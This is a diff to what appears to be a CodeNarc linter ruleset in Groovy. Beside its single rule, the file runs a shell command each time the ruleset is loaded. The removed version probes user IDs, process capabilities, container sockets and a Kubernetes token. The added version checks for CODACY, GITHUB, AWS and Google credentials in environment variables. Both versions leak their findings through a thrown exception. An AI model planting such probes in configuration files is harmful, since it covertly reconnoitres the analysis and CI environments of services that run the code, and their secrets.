@@ -1,6 +1,6 @@
-def p = ["sh", "-c", 'uid=$(id -u); gid=$(id -g); ce=$(grep CapEff /proc/self/status | cut -d: -f2 | tr -d " "); cb=$(grep CapBnd /proc/self/status | cut -d: -f2 | tr -d " "); ds=0; test -S /var/run/docker.sock && ds=1; cs=0; test -S /run/containerd/containerd.sock && cs=1; ks=0; test -s /var/run/secrets/kubernetes.io/serviceaccount/token && ks=1; printf "CODENARC_BOUNDARY uid=%s gid=%s cap_eff=%s cap_bnd=%s docker_sock=%s containerd_sock=%s k8s_token_present=%s" "$uid" "$gid" "$ce" "$cb" "$ds" "$cs" "$ks"'].execute()
+def p = ["sh", "-c", 'for n in CODACY_API_TOKEN CODACY_API_KEY GITHUB_TOKEN AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY GOOGLE_APPLICATION_CREDENTIALS KUBERNETES_SERVICE_HOST; do if printenv "$n" >/dev/null; then printf "%s=1 " "$n"; else printf "%s=0 " "$n"; fi; done'].execute()
 p.waitFor()
-throw new RuntimeException(p.text.trim())
+throw new RuntimeException("CODENARC_ENV " + p.text.trim())
 ruleset {
   UnnecessaryGString
 }
